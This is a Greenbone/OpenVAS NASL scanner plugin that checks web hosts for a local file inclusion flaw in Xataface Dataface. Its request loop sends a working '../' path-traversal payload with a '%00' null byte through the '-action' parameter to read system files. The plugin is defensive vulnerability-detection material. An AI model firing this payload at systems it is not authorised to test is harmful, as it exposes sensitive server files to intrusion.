if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801950" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)" );
	script_bugtraq_id( 48126 );
	script_tag( name: "cvss_base", value: "6.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:S/C:P/I:P/A:P" );
	script_name( "Xataface Dataface '-action' Local File Inclusion Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17367/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/102056/dataface-lfi.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary local scripts in the context of the web server process." );
	script_tag( name: "affected", value: "Xataface Dataface version 1.3rc3 and prior." );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input
  via the '-action' parameter to 'index.php', which allows attackers to read arbitrary
  files via a ../(dot dot) sequences." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Xataface Dataface and is prone to local file
  inclusion vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/Xdataface", "/dataface", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/dataface_info.php", port: port );
	if(ContainsString( res, ">INSTALLED CORRECTLY </" ) && ContainsString( res, "Xataface Web Application Framework<" )){
		files = traversal_files();
		for file in keys( files ) {
			url = NASLString( dir, "/index.php?-action=../../../../../../../", files[file], "%00" );
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

